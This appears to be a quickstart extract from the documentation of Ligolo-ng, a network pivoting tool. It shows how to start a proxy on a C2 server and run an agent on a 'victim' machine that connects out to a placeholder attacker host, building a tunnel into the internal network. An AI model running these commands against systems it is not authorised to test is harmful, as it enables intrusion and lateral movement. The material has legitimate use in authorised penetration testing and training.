# Basic tunneling with Ligolo-ng

!!! info

    This is an extract from the "Quickstart" section of the documentation.


![Basic Tunnel](/assets/graphs/BasicTunnel.svg)

## Start the Ligolo-ng proxy server

Start the *proxy* server on your Command and Control (C2) server (default port 11601):

```shell
$ ./proxy -h # Help options
$ ./proxy -autocert # Automatically request LetsEncrypt certificates
$ ./proxy -selfcert # Use self-signed certificates
```

![Start Ligolo-ng](/assets/tutorials/pivoting/start_ligolo.png)

## Start the agent

Start the *agent* on your target (victim) computer (no privileges are required!):

```shell
$ ./agent -connect attacker_c2_server.com:11601
```

!!! info

    If you want to tunnel the connection over a SOCKS5 proxy, you can use the `--socks ip:port` option. You can specify SOCKS credentials using the `--socks-user` and `--socks-pass` arguments.

A session should appear on the *proxy* server.

![Ligolo Agent Join](/assets/tutorials/pivoting/agent_1_connect.png)


Use the `session` command to select the *agent*.

```
ligolo-ng » session 
? Specify a session : 1 - nchatelain@nworkstation - XX.XX.XX.XX:38000
```

## Start the tunneling

Create a network interface using `interface_add`, setup routes to the agent network and then start the tunnel !

![Interface / Route Add](/assets/tutorials/basic/ligolo_route_add.png)

## Access the remote network

Once the tunnel is started, you can access the network resources!

![NMAP](/assets/tutorials/basic/nmap_ligolo.png)